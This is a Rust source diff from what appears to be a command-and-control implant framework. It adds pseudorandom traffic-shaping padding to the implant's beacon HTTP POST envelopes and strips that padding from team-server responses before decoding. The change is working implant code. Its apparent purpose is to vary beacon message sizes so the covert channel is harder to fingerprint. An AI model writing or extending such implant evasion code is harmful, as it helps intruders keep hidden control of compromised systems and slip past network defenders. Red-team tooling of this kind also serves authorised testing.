@@ -403,15 +403,34 @@ type StaticHeaders = nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>
 /// the wire body.
 type DataHeader = Option<(Vec<u8>, Vec<u8>)>;
 
+/// Seed for the padding PRNG: cheap xorshift32 over a static seed — mirrors
+/// beacon.rs `sleep_jitter` (padding only shapes byte counts, nothing secret).
+fn pad_seed() -> u32 {
+    static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
+    let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
+    if x == 0 {
+        x = 0x9E37_79B9;
+    }
+    x ^= x << 13;
+    x ^= x >> 17;
+    x ^= x << 5;
+    SEED.store(x, core::sync::atomic::Ordering::Relaxed);
+    x
+}
+
 /// Envelope shaping (profile-driven, done BEFORE send): encode the body via
-/// the client steps, and when the client-block terminator is a header, move
-/// the encoded bytes into a data header instead of the wire body.
+/// the client steps, append the traffic-shaping padding (self-delimiting —
+/// the server strips it before `decode`), and when the client-block
+/// terminator is a header, move the encoded bytes into a data header instead
+/// of the wire body.
 fn post_frame_shape_envelope(body: &[u8]) -> (StaticHeaders, Vec<u8>, DataHeader) {
     // ---- Envelope shaping (profile-driven, done BEFORE send) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
     let cheaders = crate::envelopes::post_client_headers();
-    let shaped = nyx_profile::encode(&csteps, body);
+    let (pmin, pmax) = crate::envelopes::post_client_padding();
+    let mut shaped = nyx_profile::encode(&csteps, body);
+    nyx_profile::pad_append(&mut shaped, pmin, pmax, pad_seed());
     let (wire_body, data_header): (Vec<u8>, DataHeader) = match &cterm {
         Some(nyx_profile::Terminator::Header(name)) => {
             (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
@@ -580,10 +599,20 @@ unsafe fn post_frame_read_response(
 
 /// Invert the http-post SERVER envelope (the response direction). The team
 /// server applied `shape_beacon_response` (print/none/uri-append → bytes in
-/// the body; header → a response header the implant doesn't read yet). With
-/// no profile the steps are empty and this is a no-op. On decode failure keep
-/// the raw bytes so the frame parse fails loudly instead of silently dropping.
+/// the body; header → a response header the implant doesn't read yet). Strip
+/// the traffic-shaping padding FIRST (it rides after the transform chain with
+/// a self-delimiting length suffix), then invert the steps. With no profile
+/// the padding is (0,0) and the steps are empty, so this is a no-op. On
+/// strip/decode failure keep the raw bytes so the frame parse fails loudly
+/// instead of silently dropping.
 fn post_frame_invert_server_envelope(out: &mut Vec<u8>) {
+    let (pmin, pmax) = crate::envelopes::post_server_padding();
+    if pmax > 0 {
+        if let Ok(stripped) = nyx_profile::pad_strip(out, pmin, pmax) {
+            let stripped = stripped.to_vec();
+            *out = stripped;
+        }
+    }
     let ssteps = crate::envelopes::post_server_steps();
     if !ssteps.is_empty() {
         if let Ok(decoded) = nyx_profile::decode(&ssteps, out) {
